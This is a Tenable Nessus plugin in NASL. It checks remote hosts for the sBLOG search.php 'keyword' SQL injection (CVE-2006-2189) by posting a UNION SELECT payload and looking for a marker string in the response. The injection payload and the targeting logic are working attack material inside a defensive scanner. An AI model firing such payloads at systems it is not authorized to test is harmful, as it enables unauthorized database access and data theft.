#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21313);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-2189");
  script_bugtraq_id(17782);
  script_osvdb_id(25612);

  script_name(english:"sBLOG search.php keyword Parameter SQL Injection");
  script_summary(english:"Checks for keyword parameter SQL injection in sBLOG");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running sBLOG, a PHP-based blog application. 

The installed version of sBLOG fails to validate user input to the
'keyword' parameter of the 'search.php' script before using it to
generate database queries.  Regardless of PHP's 'magic_quotes_gpc'
setting, an unauthenticated attacker can leverage this issue to
manipulate database queries to, for instance, bypass authentication,
disclose sensitive information, modify data, or launch attacks against
the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/432724/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/02");
 script_cvs_date("$Date: 2011/03/12 01:05:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/sblog", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Check whether the affected script exists.
  url = string(dir, "/search.php");

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If it does...
  if ("sBLOG" >< res && '<input type="text" name="keyword"' >< res)
  {
    magic = string("nessus-", unixtime());

    postdata = string(
      "keyword=", urlencode(str:string(SCRIPT_NAME, "%' UNION SELECT '", magic, "',1,2--"))
    );
    w = http_send_recv3(method:"POST", port: port, item: url,
      content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res = strcat(w[0], w[1], '\r\n', w[2]);

    # There's a problem if we see our magic string as the post topic.
    if (egrep(pattern:string('class="sblog_post_topic"><a href="[^"]+/blog\\.php\\?id=', magic, '"'), string:res))
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
